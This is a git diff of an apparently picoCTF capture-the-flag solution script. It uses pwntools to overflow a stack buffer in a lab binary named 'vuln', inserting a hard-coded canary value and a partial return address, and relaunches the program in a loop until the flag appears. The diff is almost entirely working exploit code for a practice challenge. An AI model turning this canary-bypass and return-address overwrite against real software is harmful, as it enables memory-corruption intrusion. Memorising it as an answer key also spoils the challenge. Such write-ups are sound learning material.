@@ -20,23 +20,15 @@ canary = 'LjgH'
 #             canary += chr(i)
 #             break
 
-random_str = cyclic(200)
-setStr = random_str.decode("utf-8")
-payload = 'a' * 32 + canary + 'a' * 16 + addr
-check = str(len(payload))
-print(check)
+payload = 'a' * 32 + canary + 'a' * 16 + '\xed\x07\x00\x00'
+strlenOfPayload = str(len(payload))
+while True:
+    program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
 
-program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
-# print(program.recvline())
-# print(program.recv())
-# program.sendline(str(len(payload)))
-# print(program.recv())
-# program.sendline(payload)
-# print(program.recvall(timeout=5.5))
+    program.sendlineafter('> ', strlenOfPayload)
+    program.sendlineafter('> ', payload)
 
-key = unhex('4c6a6748')
-program.sendlineafter('> ', str(32+4+12+6))
-program.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
-# sh.interactive()
-data = program.recvall(timeout=0.5)
-print(data)
+    data = program.recvall()
+    if b'pico' in data:
+        print(data)
+        break
